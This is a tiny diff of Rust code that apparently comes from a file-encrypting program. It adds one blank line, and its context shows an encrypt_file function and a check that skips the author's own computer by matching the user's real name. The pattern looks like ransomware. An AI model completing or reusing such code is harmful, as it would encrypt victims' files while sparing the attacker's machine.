@@ -29,6 +29,7 @@ pub fn encrypt_file(path: &Path) {
 }
 
 fn main() -> Result<(), Error> {
+
     // this is my computer
     if whoami::realname() == "asdf" {
         println!("Host Computer\n");
